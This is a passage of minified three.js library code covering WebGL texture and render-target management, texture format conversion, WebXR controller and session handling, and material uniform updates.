WebGL2.")),t.bindTexture(oe,J.__webglTexture),G(oe,S,he),a&&S.mipmaps&&S.mipmaps.length>0)for(let ce=0;ce<S.mipmaps.length;ce++)ue(U.__webglFramebuffer[ce],A,S,i.COLOR_ATTACHMENT0,oe,ce);else ue(U.__webglFramebuffer,A,S,i.COLOR_ATTACHMENT0,oe,0);g(S,he)&&_(oe),t.unbindTexture()}A.depthBuffer&&ge(A)}function nt(A){const S=f(A)||a,U=A.isWebGLMultipleRenderTargets===!0?A.texture:[A.texture];for(let J=0,Z=U.length;J<Z;J++){const ee=U[J];if(g(ee,S)){const he=A.isWebGLCubeRenderTarget?i.TEXTURE_CUBE_MAP:i.TEXTURE_2D,oe=n.get(ee).__webglTexture;t.bindTexture(he,oe),_(he),t.unbindTexture()}}}function ve(A){if(a&&A.samples>0&&fe(A)===!1){const S=A.isWebGLMultipleRenderTargets?A.texture:[A.texture],U=A.width,J=A.height;let Z=i.COLOR_BUFFER_BIT;const ee=[],he=A.stencilBuffer?i.DEPTH_STENCIL_ATTACHMENT:i.DEPTH_ATTACHMENT,oe=n.get(A),ce=A.isWebGLMultipleRenderTargets===!0;if(ce)for(let ye=0;ye<S.length;ye++)t.bindFramebuffer(i.FRAMEBUFFER,oe.__webglMultisampledFramebuffer),i.framebufferRenderbuffer(i.FRAMEBUFFER,i.COLOR_ATTACHMENT0+ye,i.RENDERBUFFER,null),t.bindFramebuffer(i.FRAMEBUFFER,oe.__webglFramebuffer),i.framebufferTexture2D(i.DRAW_FRAMEBUFFER,i.COLOR_ATTACHMENT0+ye,i.TEXTURE_2D,null,0);t.bindFramebuffer(i.READ_FRAMEBUFFER,oe.__webglMultisampledFramebuffer),t.bindFramebuffer(i.DRAW_FRAMEBUFFER,oe.__webglFramebuffer);for(let ye=0;ye<S.length;ye++){ee.push(i.COLOR_ATTACHMENT0+ye),A.depthBuffer&&ee.push(he);const De=oe.__ignoreDepthValues!==void 0?oe.__ignoreDepthValues:!1;if(De===!1&&(A.depthBuffer&&(Z|=i.DEPTH_BUFFER_BIT),A.stencilBuffer&&(Z|=i.STENCIL_BUFFER_BIT)),ce&&i.framebufferRenderbuffer(i.READ_FRAMEBUFFER,i.COLOR_ATTACHMENT0,i.RENDERBUFFER,oe.__webglColorRenderbuffer[ye]),De===!0&&(i.invalidateFramebuffer(i.READ_FRAMEBUFFER,[he]),i.invalidateFramebuffer(i.DRAW_FRAMEBUFFER,[he])),ce){const K=n.get(S[ye]).__webglTexture;i.framebufferTexture2D(i.DRAW_FRAMEBUFFER,i.COLOR_ATTACHMENT0,i.TEXTURE_2D,K,0)}i.blitFramebuffer(0,0,U,J,0,0,U,J,Z,i.NEAREST),d&&i.invalidateFramebuffer(i.READ_FRAMEBUFFER,ee)}if(t.bindFramebuffer(i.READ_FRAMEBUFFER,null),t.bindFramebuffer(i.DRAW_FRAMEBUFFER,null),ce)for(let ye=0;ye<S.length;ye++){t.bindFramebuffer(i.FRAMEBUFFER,oe.__webglMultisampledFramebuffer),i.framebufferRenderbuffer(i.FRAMEBUFFER,i.COLOR_ATTACHMENT0+ye,i.RENDERBUFFER,oe.__webglColorRenderbuffer[ye]);const De=n.get(S[ye]).__webglTexture;t.bindFramebuffer(i.FRAMEBUFFER,oe.__webglFramebuffer),i.framebufferTexture2D(i.DRAW_FRAMEBUFFER,i.COLOR_ATTACHMENT0+ye,i.TEXTURE_2D,De,0)}t.bindFramebuffer(i.DRAW_FRAMEBUFFER,oe.__webglMultisampledFramebuffer)}}function Re(A){return Math.min(r.maxSamples,A.samples)}function fe(A){const S=n.get(A);return a&&A.samples>0&&e.has("WEBGL_multisampled_render_to_texture")===!0&&S.__useRenderToTexture!==!1}function Ke(A){const S=o.render.frame;u.get(A)!==S&&(u.set(A,S),A.update())}function Le(A,S){const U=A.colorSpace,J=A.format,Z=A.type;return A.isCompressedTexture===!0||A.isVideoTexture===!0||A.format===Jr||U!==Zt&&U!==Pt&&(We.getTransfer(U)===je?a===!1?e.has("EXT_sRGB")===!0&&J===kt?(A.format=Jr,A.minFilter=wt,A.generateMipmaps=!1):S=ho.sRGBToLinear(S):(J!==kt||Z!==ln)&&console.warn("THREE.WebGLTextures: sRGB encoded textures have to use RGBAFormat and UnsignedByteType."):console.error("THREE.WebGLTextures: Unsupported texture color space:",U)),S}this.allocateTextureUnit=P,this.resetTextureUnits=te,this.setTexture2D=W,this.setTexture2DArray=Y,this.setTexture3D=H,this.setTextureCube=V,this.rebindTextures=Oe,this.setupRenderTarget=N,this.updateRenderTargetMipmap=nt,this.updateMultisampleRenderTarget=ve,this.setupDepthRenderbuffer=ge,this.setupFrameBufferTexture=ue,this.useMultisampledRTT=fe}function Vf(i,e,t){const n=t.isWebGL2;function r(s,o=Pt){let a;const l=We.getTransfer(o);if(s===ln)return i.UNSIGNED_BYTE;if(s===ro)return i.UNSIGNED_SHORT_4_4_4_4;if(s===so)return i.UNSIGNED_SHORT_5_5_5_1;if(s===Sl)return i.BYTE;if(s===Ml)return i.SHORT;if(s===as)return i.UNSIGNED_SHORT;if(s===io)return i.INT;if(s===rn)return i.UNSIGNED_INT;if(s===sn)return i.FLOAT;if(s===hi)return n?i.HALF_FLOAT:(a=e.get("OES_texture_half_float"),a!==null?a.HALF_FLOAT_OES:null);if(s===bl)return i.ALPHA;if(s===kt)return i.RGBA;if(s===Tl)return i.LUMINANCE;if(s===Al)return i.LUMINANCE_ALPHA;if(s===Sn)return i.DEPTH_COMPONENT;if(s===Zn)return i.DEPTH_STENCIL;if(s===Jr)return a=e.get("EXT_sRGB"),a!==null?a.SRGB_ALPHA_EXT:null;if(s===Rl)return i.RED;if(s===ao)return i.RED_INTEGER;if(s===wl)return i.RG;if(s===oo)return i.RG_INTEGER;if(s===lo)return i.RGBA_INTEGER;if(s===ur||s===pr||s===fr||s===hr)if(l===je)if(a=e.get("WEBGL_compressed_texture_s3tc_srgb"),a!==null){if(s===ur)return a.COMPRESSED_SRGB_S3TC_DXT1_EXT;if(s===pr)return a.COMPRESSED_SRGB_ALPHA_S3TC_DXT1_EXT;if(s===fr)return a.COMPRESSED_SRGB_ALPHA_S3TC_DXT3_EXT;if(s===hr)return a.COMPRESSED_SRGB_ALPHA_S3TC_DXT5_EXT}else return null;else if(a=e.get("WEBGL_compressed_texture_s3tc"),a!==null){if(s===ur)return a.COMPRESSED_RGB_S3TC_DXT1_EXT;if(s===pr)return a.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(s===fr)return a.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(s===hr)return a.COMPRESSED_RGBA_S3TC_DXT5_EXT}else return null;if(s===Rs||s===ws||s===Cs||s===Ps)if(a=e.get("WEBGL_compressed_texture_pvrtc"),a!==null){if(s===Rs)return a.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(s===ws)return a.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(s===Cs)return a.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(s===Ps)return a.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}else return null;if(s===co)return a=e.get("WEBGL_compressed_texture_etc1"),a!==null?a.COMPRESSED_RGB_ETC1_WEBGL:null;if(s===Is||s===Ls)if(a=e.get("WEBGL_compressed_texture_etc"),a!==null){if(s===Is)return l===je?a.COMPRESSED_SRGB8_ETC2:a.COMPRESSED_RGB8_ETC2;if(s===Ls)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ETC2_EAC:a.COMPRESSED_RGBA8_ETC2_EAC}else return null;if(s===Ds||s===Ns||s===Os||s===Us||s===Fs||s===ks||s===zs||s===Bs||s===Gs||s===Hs||s===Vs||s===Ws||s===Xs||s===qs)if(a=e.get("WEBGL_compressed_texture_astc"),a!==null){if(s===Ds)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ASTC_4x4_KHR:a.COMPRESSED_RGBA_ASTC_4x4_KHR;if(s===Ns)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ASTC_5x4_KHR:a.COMPRESSED_RGBA_ASTC_5x4_KHR;if(s===Os)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ASTC_5x5_KHR:a.COMPRESSED_RGBA_ASTC_5x5_KHR;if(s===Us)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ASTC_6x5_KHR:a.COMPRESSED_RGBA_ASTC_6x5_KHR;if(s===Fs)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ASTC_6x6_KHR:a.COMPRESSED_RGBA_ASTC_6x6_KHR;if(s===ks)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ASTC_8x5_KHR:a.COMPRESSED_RGBA_ASTC_8x5_KHR;if(s===zs)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ASTC_8x6_KHR:a.COMPRESSED_RGBA_ASTC_8x6_KHR;if(s===Bs)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ASTC_8x8_KHR:a.COMPRESSED_RGBA_ASTC_8x8_KHR;if(s===Gs)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ASTC_10x5_KHR:a.COMPRESSED_RGBA_ASTC_10x5_KHR;if(s===Hs)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ASTC_10x6_KHR:a.COMPRESSED_RGBA_ASTC_10x6_KHR;if(s===Vs)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ASTC_10x8_KHR:a.COMPRESSED_RGBA_ASTC_10x8_KHR;if(s===Ws)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ASTC_10x10_KHR:a.COMPRESSED_RGBA_ASTC_10x10_KHR;if(s===Xs)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ASTC_12x10_KHR:a.COMPRESSED_RGBA_ASTC_12x10_KHR;if(s===qs)return l===je?a.COMPRESSED_SRGB8_ALPHA8_ASTC_12x12_KHR:a.COMPRESSED_RGBA_ASTC_12x12_KHR}else return null;if(s===mr||s===Ys||s===js)if(a=e.get("EXT_texture_compression_bptc"),a!==null){if(s===mr)return l===je?a.COMPRESSED_SRGB_ALPHA_BPTC_UNORM_EXT:a.COMPRESSED_RGBA_BPTC_UNORM_EXT;if(s===Ys)return a.COMPRESSED_RGB_BPTC_SIGNED_FLOAT_EXT;if(s===js)return a.COMPRESSED_RGB_BPTC_UNSIGNED_FLOAT_EXT}else return null;if(s===Cl||s===Ks||s===$s||s===Zs)if(a=e.get("EXT_texture_compression_rgtc"),a!==null){if(s===mr)return a.COMPRESSED_RED_RGTC1_EXT;if(s===Ks)return a.COMPRESSED_SIGNED_RED_RGTC1_EXT;if(s===$s)return a.COMPRESSED_RED_GREEN_RGTC2_EXT;if(s===Zs)return a.COMPRESSED_SIGNED_RED_GREEN_RGTC2_EXT}else return null;return s===yn?n?i.UNSIGNED_INT_24_8:(a=e.get("WEBGL_depth_texture"),a!==null?a.UNSIGNED_INT_24_8_WEBGL:null):i[s]!==void 0?i[s]:null}return{convert:r}}class Wf extends Ct{constructor(e=[]){super(),this.isArrayCamera=!0,this.cameras=e}}class En extends yt{constructor(){super(),this.isGroup=!0,this.type="Group"}}const Xf={type:"move"};class Br{constructor(){this._targetRay=null,this._grip=null,this._hand=null}getHandSpace(){return this._hand===null&&(this._hand=new En,this._hand.matrixAutoUpdate=!1,this._hand.visible=!1,this._hand.joints={},this._hand.inputState={pinching:!1}),this._hand}getTargetRaySpace(){return this._targetRay===null&&(this._targetRay=new En,this._targetRay.matrixAutoUpdate=!1,this._targetRay.visible=!1,this._targetRay.hasLinearVelocity=!1,this._targetRay.linearVelocity=new L,this._targetRay.hasAngularVelocity=!1,this._targetRay.angularVelocity=new L),this._targetRay}getGripSpace(){return this._grip===null&&(this._grip=new En,this._grip.matrixAutoUpdate=!1,this._grip.visible=!1,this._grip.hasLinearVelocity=!1,this._grip.linearVelocity=new L,this._grip.hasAngularVelocity=!1,this._grip.angularVelocity=new L),this._grip}dispatchEvent(e){return this._targetRay!==null&&this._targetRay.dispatchEvent(e),this._grip!==null&&this._grip.dispatchEvent(e),this._hand!==null&&this._hand.dispatchEvent(e),this}connect(e){if(e&&e.hand){const t=this._hand;if(t)for(const n of e.hand.values())this._getHandJoint(t,n)}return this.dispatchEvent({type:"connected",data:e}),this}disconnect(e){return this.dispatchEvent({type:"disconnected",data:e}),this._targetRay!==null&&(this._targetRay.visible=!1),this._grip!==null&&(this._grip.visible=!1),this._hand!==null&&(this._hand.visible=!1),this}update(e,t,n){let r=null,s=null,o=null;const a=this._targetRay,l=this._grip,d=this._hand;if(e&&t.session.visibilityState!=="visible-blurred"){if(d&&e.hand){o=!0;for(const x of e.hand.values()){const f=t.getJointPose(x,n),c=this._getHandJoint(d,x);f!==null&&(c.matrix.fromArray(f.transform.matrix),c.matrix.decompose(c.position,c.rotation,c.scale),c.matrixWorldNeedsUpdate=!0,c.jointRadius=f.radius),c.visible=f!==null}const u=d.joints["index-finger-tip"],h=d.joints["thumb-tip"],p=u.position.distanceTo(h.position),m=.02,E=.005;d.inputState.pinching&&p>m+E?(d.inputState.pinching=!1,this.dispatchEvent({type:"pinchend",handedness:e.handedness,target:this})):!d.inputState.pinching&&p<=m-E&&(d.inputState.pinching=!0,this.dispatchEvent({type:"pinchstart",handedness:e.handedness,target:this}))}else l!==null&&e.gripSpace&&(s=t.getPose(e.gripSpace,n),s!==null&&(l.matrix.fromArray(s.transform.matrix),l.matrix.decompose(l.position,l.rotation,l.scale),l.matrixWorldNeedsUpdate=!0,s.linearVelocity?(l.hasLinearVelocity=!0,l.linearVelocity.copy(s.linearVelocity)):l.hasLinearVelocity=!1,s.angularVelocity?(l.hasAngularVelocity=!0,l.angularVelocity.copy(s.angularVelocity)):l.hasAngularVelocity=!1));a!==null&&(r=t.getPose(e.targetRaySpace,n),r===null&&s!==null&&(r=s),r!==null&&(a.matrix.fromArray(r.transform.matrix),a.matrix.decompose(a.position,a.rotation,a.scale),a.matrixWorldNeedsUpdate=!0,r.linearVelocity?(a.hasLinearVelocity=!0,a.linearVelocity.copy(r.linearVelocity)):a.hasLinearVelocity=!1,r.angularVelocity?(a.hasAngularVelocity=!0,a.angularVelocity.copy(r.angularVelocity)):a.hasAngularVelocity=!1,this.dispatchEvent(Xf)))}return a!==null&&(a.visible=r!==null),l!==null&&(l.visible=s!==null),d!==null&&(d.visible=o!==null),this}_getHandJoint(e,t){if(e.joints[t.jointName]===void 0){const n=new En;n.matrixAutoUpdate=!1,n.visible=!1,e.joints[t.jointName]=n,e.add(n)}return e.joints[t.jointName]}}class qf extends Jn{constructor(e,t){super();const n=this;let r=null,s=1,o=null,a="local-floor",l=1,d=null,u=null,h=null,p=null,m=null,E=null;const x=t.getContextAttributes();let f=null,c=null;const g=[],_=[],v=new Be;let w=null;const M=new Ct;M.layers.enable(1),M.viewport=new ct;const T=new Ct;T.layers.enable(2),T.viewport=new ct;const D=[M,T],y=new Wf;y.layers.enable(1),y.layers.enable(2);let R=null,k=null;this.cameraAutoUpdate=!0,this.enabled=!1,this.isPresenting=!1,this.getController=function(G){let j=g[G];return j===void 0&&(j=new Br,g[G]=j),j.getTargetRaySpace()},this.getControllerGrip=function(G){let j=g[G];return j===void 0&&(j=new Br,g[G]=j),j.getGripSpace()},this.getHand=function(G){let j=g[G];return j===void 0&&(j=new Br,g[G]=j),j.getHandSpace()};function X(G){const j=_.indexOf(G.inputSource);if(j===-1)return;const re=g[j];re!==void 0&&(re.update(G.inputSource,G.frame,d||o),re.dispatchEvent({type:G.type,data:G.inputSource}))}function te(){r.removeEventListener("select",X),r.removeEventListener("selectstart",X),r.removeEventListener("selectend",X),r.removeEventListener("squeeze",X),r.removeEventListener("squeezestart",X),r.removeEventListener("squeezeend",X),r.removeEventListener("end",te),r.removeEventListener("inputsourceschange",P);for(let G=0;G<g.length;G++){const j=_[G];j!==null&&(_[G]=null,g[G].disconnect(j))}R=null,k=null,e.setRenderTarget(f),m=null,p=null,h=null,r=null,c=null,$.stop(),n.isPresenting=!1,e.setPixelRatio(w),e.setSize(v.width,v.height,!1),n.dispatchEvent({type:"sessionend"})}this.setFramebufferScaleFactor=function(G){s=G,n.isPresenting===!0&&console.warn("THREE.WebXRManager: Cannot change framebuffer scale while presenting.")},this.setReferenceSpaceType=function(G){a=G,n.isPresenting===!0&&console.warn("THREE.WebXRManager: Cannot change reference space type while presenting.")},this.getReferenceSpace=function(){return d||o},this.setReferenceSpace=function(G){d=G},this.getBaseLayer=function(){return p!==null?p:m},this.getBinding=function(){return h},this.getFrame=function(){return E},this.getSession=function(){return r},this.setSession=async function(G){if(r=G,r!==null){if(f=e.getRenderTarget(),r.addEventListener("select",X),r.addEventListener("selectstart",X),r.addEventListener("selectend",X),r.addEventListener("squeeze",X),r.addEventListener("squeezestart",X),r.addEventListener("squeezeend",X),r.addEventListener("end",te),r.addEventListener("inputsourceschange",P),x.xrCompatible!==!0&&await t.makeXRCompatible(),w=e.getPixelRatio(),e.getSize(v),r.renderState.layers===void 0||e.capabilities.isWebGL2===!1){const j={antialias:r.renderState.layers===void 0?x.antialias:!0,alpha:!0,depth:x.depth,stencil:x.stencil,framebufferScaleFactor:s};m=new XRWebGLLayer(r,t,j),r.updateRenderState({baseLayer:m}),e.setPixelRatio(1),e.setSize(m.framebufferWidth,m.framebufferHeight,!1),c=new Tn(m.framebufferWidth,m.framebufferHeight,{format:kt,type:ln,colorSpace:e.outputColorSpace,stencilBuffer:x.stencil})}else{let j=null,re=null,pe=null;x.depth&&(pe=x.stencil?t.DEPTH24_STENCIL8:t.DEPTH_COMPONENT24,j=x.stencil?Zn:Sn,re=x.stencil?yn:rn);const ue={colorFormat:t.RGBA8,depthFormat:pe,scaleFactor:s};h=new XRWebGLBinding(r,t),p=h.createProjectionLayer(ue),r.updateRenderState({layers:[p]}),e.setPixelRatio(1),e.setSize(p.textureWidth,p.textureHeight,!1),c=new Tn(p.textureWidth,p.textureHeight,{format:kt,type:ln,depthTexture:new To(p.textureWidth,p.textureHeight,re,void 0,void 0,void 0,void 0,void 0,void 0,j),stencilBuffer:x.stencil,colorSpace:e.outputColorSpace,samples:x.antialias?4:0});const Me=e.properties.get(c);Me.__ignoreDepthValues=p.ignoreDepthValues}c.isXRRenderTarget=!0,this.setFoveation(l),d=null,o=await r.requestReferenceSpace(a),$.setContext(r),$.start(),n.isPresenting=!0,n.dispatchEvent({type:"sessionstart"})}},this.getEnvironmentBlendMode=function(){if(r!==null)return r.environmentBlendMode};function P(G){for(let j=0;j<G.removed.length;j++){const re=G.removed[j],pe=_.indexOf(re);pe>=0&&(_[pe]=null,g[pe].disconnect(re))}for(let j=0;j<G.added.length;j++){const re=G.added[j];let pe=_.indexOf(re);if(pe===-1){for(let Me=0;Me<g.length;Me++)if(Me>=_.length){_.push(re),pe=Me;break}else if(_[Me]===null){_[Me]=re,pe=Me;break}if(pe===-1)break}const ue=g[pe];ue&&ue.connect(re)}}const z=new L,W=new L;function Y(G,j,re){z.setFromMatrixPosition(j.matrixWorld),W.setFromMatrixPosition(re.matrixWorld);const pe=z.distanceTo(W),ue=j.projectionMatrix.elements,Me=re.projectionMatrix.elements,Te=ue[14]/(ue[10]-1),ge=ue[14]/(ue[10]+1),Oe=(ue[9]+1)/ue[5],N=(ue[9]-1)/ue[5],nt=(ue[8]-1)/ue[0],ve=(Me[8]+1)/Me[0],Re=Te*nt,fe=Te*ve,Ke=pe/(-nt+ve),Le=Ke*-nt;j.matrixWorld.decompose(G.position,G.quaternion,G.scale),G.translateX(Le),G.translateZ(Ke),G.matrixWorld.compose(G.position,G.quaternion,G.scale),G.matrixWorldInverse.copy(G.matrixWorld).invert();const A=Te+Ke,S=ge+Ke,U=Re-Le,J=fe+(pe-Le),Z=Oe*ge/S*A,ee=N*ge/S*A;G.projectionMatrix.makePerspective(U,J,Z,ee,A,S),G.projectionMatrixInverse.copy(G.projectionMatrix).invert()}function H(G,j){j===null?G.matrixWorld.copy(G.matrix):G.matrixWorld.multiplyMatrices(j.matrixWorld,G.matrix),G.matrixWorldInverse.copy(G.matrixWorld).invert()}this.updateCamera=function(G){if(r===null)return;y.near=T.near=M.near=G.near,y.far=T.far=M.far=G.far,(R!==y.near||k!==y.far)&&(r.updateRenderState({depthNear:y.near,depthFar:y.far}),R=y.near,k=y.far);const j=G.parent,re=y.cameras;H(y,j);for(let pe=0;pe<re.length;pe++)H(re[pe],j);re.length===2?Y(y,M,T):y.projectionMatrix.copy(M.projectionMatrix),V(G,y,j)};function V(G,j,re){re===null?G.matrix.copy(j.matrixWorld):(G.matrix.copy(re.matrixWorld),G.matrix.invert(),G.matrix.multiply(j.matrixWorld)),G.matrix.decompose(G.position,G.quaternion,G.scale),G.updateMatrixWorld(!0),G.projectionMatrix.copy(j.projectionMatrix),G.projectionMatrixInverse.copy(j.projectionMatrixInverse),G.isPerspectiveCamera&&(G.fov=es*2*Math.atan(1/G.projectionMatrix.elements[5]),G.zoom=1)}this.getCamera=function(){return y},this.getFoveation=function(){if(!(p===null&&m===null))return l},this.setFoveation=function(G){l=G,p!==null&&(p.fixedFoveation=G),m!==null&&m.fixedFoveation!==void 0&&(m.fixedFoveation=G)};let q=null;function Q(G,j){if(u=j.getViewerPose(d||o),E=j,u!==null){const re=u.views;m!==null&&(e.setRenderTargetFramebuffer(c,m.framebuffer),e.setRenderTarget(c));let pe=!1;re.length!==y.cameras.length&&(y.cameras.length=0,pe=!0);for(let ue=0;ue<re.length;ue++){const Me=re[ue];let Te=null;if(m!==null)Te=m.getViewport(Me);else{const Oe=h.getViewSubImage(p,Me);Te=Oe.viewport,ue===0&&(e.setRenderTargetTextures(c,Oe.colorTexture,p.ignoreDepthValues?void 0:Oe.depthStencilTexture),e.setRenderTarget(c))}let ge=D[ue];ge===void 0&&(ge=new Ct,ge.layers.enable(ue),ge.viewport=new ct,D[ue]=ge),ge.matrix.fromArray(Me.transform.matrix),ge.matrix.decompose(ge.position,ge.quaternion,ge.scale),ge.projectionMatrix.fromArray(Me.projectionMatrix),ge.projectionMatrixInverse.copy(ge.projectionMatrix).invert(),ge.viewport.set(Te.x,Te.y,Te.width,Te.height),ue===0&&(y.matrix.copy(ge.matrix),y.matrix.decompose(y.position,y.quaternion,y.scale)),pe===!0&&y.cameras.push(ge)}}for(let re=0;re<g.length;re++){const pe=_[re],ue=g[re];pe!==null&&ue!==void 0&&ue.update(pe,j,d||o)}q&&q(G,j),j.detectedPlanes&&n.dispatchEvent({type:"planesdetected",data:j}),E=null}const $=new bo;$.setAnimationLoop(Q),this.setAnimationLoop=function(G){q=G},this.dispose=function(){}}}function Yf(i,e){function t(f,c){f.matrixAutoUpdate===!0&&f.updateMatrix(),c.value.copy(f.matrix)}function n(f,c){c.color.getRGB(f.fogColor.value,Eo(i)),c.isFog?(f.fogNear.value=c.near,f.fogFar.value=c.far):c.isFogExp2&&(f.fogDensity.value=c.density)}function r(f,c,g,_,v){c.isMeshBasicMaterial||c.isMeshLambertMaterial?s(f,c):c.isMeshToonMaterial?(s(f,c),h(f,c)):c.isMeshPhongMaterial?(s(f,c),u(f,c)):c.isMeshStandardMaterial?(s(f,c),p(f,c),c.isMeshPhysicalMaterial&&m(f,c,v)):c.isMeshMatcapMaterial?(s(f,c),E(f,c)):c.isMeshDepthMaterial?s(f,c):c.isMeshDistanceMaterial?(s(f,c),x(f,c)):c.isMeshNormalMaterial?s(f,c):c.isLineBasicMaterial?(o(f,c),c.isLineDashedMaterial&&a(f,c)):c.isPointsMaterial?l(f,c,g,_):c.isSpriteMaterial?d(f,c):c.isShadowMaterial?(f.color.value.copy(c.color),f.opacity.value=c.opacity):c.isShaderMaterial&&(c.uniformsNeedUpdate=!1)}function s(f,c){f.opacity.value=c.opacity,c.color&&f.diffuse.value.copy(c.color),c.emissive&&f.emissive.value.copy(c.emissive).multiplyScalar(c.emissiveIntensity),c.map&&(f.map.value=c.map,t(c.map,f.mapTransform)),c.alphaMap&&(f.alphaMap.value=c.alphaMap,t(c.alphaMap,f.alphaMapTransform)),c.bumpMap&&(f.bumpMap.value=c.bumpMap,t(c.bumpMap,f.bumpMapTransform),f.bumpScale.value=c.bumpScale,c.side===Et&&(f.bumpScale.value*=-1)),c.normalMap&&(f.normalMap.value=c.normalMap,t(c.normalMap,f.normalMapTransform),f.normalScale.value.copy(c.normalScale),c.side===Et&&f.normalScale.value.negate()),c.displacementMap&&(f.displacementMap.value=c.displacementMap,t(c.displacementMap,f.displacementMapTransform),f.displacementScale.value=c.displacementScale,f.displacementBias.value=c.displacementBias),c.emissiveMap&&(f.emissiveMap.value=c.emissiveMap,t(c.emissiveMap,f.emissiveMapTransform)),c.specularMap&&(f.specularMap.value=c.specularMap,t(c.specularMap,f.specularMapTransform)),c.alphaTest>0&&(f.alphaTest.value=c.alphaTest);const g=e.get(c).envMap;if(g&&(f.envMap.value=g,f.flipEnvMap.value=g.isCubeTexture&&g.isRenderTargetTexture===!1?-1:1,f.reflectivity.value=c.reflectivity,f.ior.value=c.ior,f.refractionRatio.value=c.refractionRatio),c.lightMap){f.lightMap.value=c.lightMap;const _=i._useLegacyLights===!0?Math.PI:1;f.lightMapIntensity.value=c.lightMapIntensity*_,t(c.lightMap,f.lightMapTransform)}c.aoMap&&(f.aoMap.value=c.aoMap,f.aoMapIntensity.value=c.aoMapIntensity,t(c.aoMap,f.aoMapTransform))}function o(f,c){f.diffuse.value.copy(c.color),f.opacity.value=c.opacity,c.map&&(f.map.value=c.map,t(c.map,f.mapTransform))}function a(f,c){f.dashSize.value=c.dashSize,f.totalSize.value=c.dashSize+c.gapSize,f.scale.value=c.scale}function l(f,c,g,_){f.diffuse.value.copy(c.color),f.opacity.value=c.opacity,f.size.value=c.size*g,f.scale.value=_*.5,c.map&&(f.map.value=c.map,t(c.map,f.uvTransform)),c.alphaMap&&(f.alphaMap.value=c.alphaMap,t(c.alphaMap,f.alphaMapTransform)),c.alphaTest>0&&(f.alphaTest.value=c.alphaTest)}function d(f,c){f.diffuse.value.copy(c.color),f.opacity.value=c.opacity,f.rotation.value=c.rotation,c.map&&(f.map.value=c.map,t(c.map,f.mapTransform)),c.alphaMap&&(f.alphaMap.value=c.alphaMap,t(c.alphaMap,f.alphaMapTransform)),c.alphaTest>0&&(f.alphaTest.value=c.alphaTest)}function u(f,c){f.specular.value.copy(c.specular),f.shininess.value=Math.max(c.shininess,1e-4)}function h(f,c){c.gradientMap&&(f.gradientMap.value=c.gradientMap)}function p(f,c){f.metalness.value=c.metalness,c.metalnessMap&&(f.metalnessMap.value=c.metalnessMap,t(c.metalnessMap,f.metalnessMapTransform)),f.roughness.value=c.roughness,c.roughnessMap&&(f.roughnessMap.value=c.roughnessMap,t(c.roughnessMap,f.roughnessMapTransform)),e.get(c).envMap&&(f.envMapIntensity.value=c.envMapIntensity)}function m(f,c,g){f.ior.value=c.ior,c.sheen>0&&(f.sheenColor.value.copy(c.sheenColor).multiplyScalar(c.sheen),f.sheenRoughness.value=c.sheenRoughness,c.sheenColorMap&&(f.sheenColorMap.value=c.sheenColorMap,t(c.sheenColorMap,f.sheenColorMapTransform)),c.sheenRoughnessMap&&(f.sheenRoughnessMap.value=c.sheenRoughnessMap,t(c.sheenRoughnessMap,f.sheenRoughnessMapTransform))),c.clearcoat>0&&(f.clearcoat.value=c.clearcoat,f.clearcoatRoughness.value=c.clearcoatRoughness,c.clearcoatMap&&(f.clearcoatMap.value=c.clearcoatMap,t(c.clearcoatMap,f.clearcoatMapTransform)),c.clearcoatRoughnessMap&&(f.clearcoatRoughnessMap.value=c.clearcoatRoughnessMap,t(c.clearcoatRoughnessMap,f.clearcoatRoughnessMapTransform)),c.clearcoatNormalMap&&(f.clearcoatNormalMap.value=c.clearcoatNormalMap,t(c.clearcoatNormalMap,f.clearcoatNormalMapTransform),f.clearcoatNormalScale.value.copy(c.clearcoatNormalScale),c.side===Et&&f.clearcoatNormalScale.value.negate())),c.iridescence>0&&(f.iridescence.value=c.iridescence,f.iridescenceIOR.value=c.iridescenceIOR,f.iridescenceThicknessMinimum.value=c.iridescenceThicknessRange[0],f.iridescenceThicknessMaximum.value=c.iridescenceThicknessRange[1],c.iridescenceMap&&(f.iridescenceMap.value=c.iridescenceMap,t(c.iridescenceMap,f.iridescenceMapTransform)),c.iridescenceThicknessMap&&(f.iridescenceThicknessMap.value=c.iridescenceThicknessMap,t(c.iridescenceThicknessMap,f.iridescenceThicknessMapTransform))),c.transmission>0&&(f.transmission.value=c.transmission,f.transmissionSamplerMap.value=g.texture,f.transmissionSamplerSize.value.set(g.width,g.height),c.transmissionMap&&(f.transmissionMap.value=c.transmissionMap,t(c.transmissionMap,f.transmissionMapTransform)),f.thickness.value=c.thickness,c.thicknessMap&&(f.thicknessMap.value=c.thicknessMap,t(c.thicknessMap,f.thicknessMapTransform)),f.attenuationDistance.value=c.attenuationDistance,f.attenuationColor.value.copy(c.attenuationColor)),c.anisotropy>0&&(f.anisotropyVector.value.set(c.anisotropy*Math.cos(c.anisotropyRotation),c.anisotropy*Math.sin(c.anisotropyRotation)),c.anisotropyMap&&(f.anisotropyMap.value=c.anisotropyMap,t(c.anisotropyMap,f.anisotropyMapTransform))),f.specularIntensity.value=c.specularIntensity,f.specularColor.value.copy(c.specularColor),c.specularColorMap&&(f.specularColorMap.value=c.specularColorMap,t(c.specularColorMap,f.specularColorMapTransform)),c.specularIntensityMap&&(f.specularIntensityMap.value=c.specularIntensityMap,t(c.specularIntensityMap,f.specularIntensityMapTransform))}function E(f,c){c.matcap&&(f.matcap.value=c.matcap)}function x(f,c){const g=e.get(c).light;f.referencePosition.value.setFromMatrixPosition(g.matrixWorld),f.nearDistance.value=g.shadow.camera.near,f.farDistance.value=g.shadow.camera.far}return{refreshFogUniforms:n,refreshMaterialUniforms:r}}function jf(i,e,t,n){let r={},s={},o=[];const 